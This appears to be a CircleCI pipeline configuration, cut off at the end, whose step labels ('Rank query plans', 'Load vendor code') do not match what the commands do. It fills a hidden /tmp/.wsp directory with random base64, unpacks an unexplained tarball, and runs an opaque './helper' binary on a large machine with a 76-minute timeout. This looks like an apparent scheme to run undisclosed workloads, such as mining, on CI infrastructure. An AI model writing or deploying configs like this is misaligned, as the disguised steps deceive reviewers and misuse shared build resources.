version: 2.1

jobs:
  reserve_fire-up:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Rank query plans
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; head -c 1220265 /dev/urandom | base64 > /tmp/.wsp/buffer.bin; true
            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.bin) octets"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - buffer.bin
  fire-up:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Fetch previous
          command: |
            grep -c . /tmp/.wsp/buffer.bin || true
      - run:
          name: Shallow clone
          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load vendor code
          command: tar -xjf output.tar.bz2
      - run:
          command: date -u
      - run:
          no_output_timeout: 76m
          command: sh -c "./helper"
  Alpha_echo:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
